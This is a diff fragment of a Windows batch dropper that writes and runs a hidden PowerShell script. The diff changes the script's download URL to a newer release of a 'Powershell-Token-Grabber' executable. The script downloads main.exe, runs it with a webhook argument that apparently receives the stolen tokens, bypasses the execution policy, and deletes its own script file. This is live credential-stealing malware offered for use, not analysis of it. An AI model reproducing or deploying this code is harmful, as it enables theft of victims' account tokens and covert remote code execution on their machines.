@@ -130,7 +130,7 @@ echo $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell123.ps1
 echo if ($TEMP_KOT -eq $false) { >> powershell123.ps1
 echo New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell123.ps1
 echo } >> powershell123.ps1
-echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell123.ps1
+echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell123.ps1
 echo $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell123.ps1
 echo $proc.WaitForExit() >> powershell123.ps1
 echo $extracted = "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
@@ -240,4 +240,3 @@ powershell.exe -noprofile -executionpolicy bypass -WindowStyle hidden -file powe
 del powershell123.ps1 /f /q
 timeout 3 > nul
 exit
-
